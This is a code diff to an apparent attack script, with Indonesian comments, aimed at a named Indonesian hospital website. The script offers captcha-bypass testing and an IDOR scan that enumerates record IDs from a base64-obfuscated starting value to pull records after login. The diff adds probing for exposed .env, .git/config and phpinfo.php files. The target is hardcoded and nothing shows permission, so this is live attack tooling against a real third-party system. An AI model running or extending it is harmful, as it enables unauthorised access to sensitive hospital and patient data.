@@ -104,6 +104,33 @@ def fetch_data(id_num):
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
 
+def audit_security_config():
+    print("[*] Starting Security Configuration Audit...")
+    base_url = "https://dolan.rsudsoetijonoblora.com/" 
+    
+    # 1. Security Headers Check
+    print("\n[+] Audit: Security Headers Analysis")
+    try:
+        res = session.get(base_url, timeout=10)
+        sec_headers = ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
+        for h in sec_headers:
+            status = "\033[92mFound\033[0m" if h in res.headers else "\033[91mMissing\033[0m"
+            print(f" [!] {h.ljust(25)}: {status}")
+    except: print("[!] Error: Host unreachable.")
+
+    # 2. Information Disclosure Check (Sensitive Paths)
+    print("\n[+] Audit: Sensitive Path Discovery")
+    paths = [".env", ".git/config", "robots.txt", "phpinfo.php", ".htaccess"]
+    for p in paths:
+        target = base_url + p
+        try:
+            r = session.get(target, timeout=5)
+            if r.status_code == 200 and len(r.text) > 0:
+                print(f" [\033[91m!\033[0m] Potential Leakage : {target} (\033[91m200 OK\033[0m)")
+            else:
+                print(f" [\033[92m✓\033[0m] Path {p.ljust(12)} : Secure ({r.status_code})")
+        except: pass
+
 def start_process(start_range, end_range):
     if login():
         print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
@@ -116,8 +143,8 @@ def main_menu():
         clear()
         show_banner()
         print(" [1] Auth Test (Captcha Bypass Testing)")
-        print(" [2] IDOR Scan (Input Range Manual)")
-        print(" [3] IDOR Scan (Range Default)")
+        print(" [2] IDOR Scan (Input Jumlah Data)")
+        print(" [3] Security Config Audit (Headers & Files)")
         print(" [0] Exit")
         print("\n")
         
@@ -129,16 +156,14 @@ def main_menu():
         elif choice == '2':
             try:
                 count = int(input("[?] Jumlah data yang ingin di scan: "))
-                BASE_ID = int(_decode("NTAyMDEz")) # 502013
+                BASE_ID = int(_decode("NTAyMDEz")) 
                 # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
                 start_process(BASE_ID, BASE_ID + count)
             except ValueError:
                 print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '3':
-            AWAL = int(_decode("NTAyMDEz")) 
-            AKHIR = int(_decode("NTExODU4")) 
-            start_process(AWAL, AKHIR)
+            audit_security_config()
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '0':
             print("Happy Auditing!")
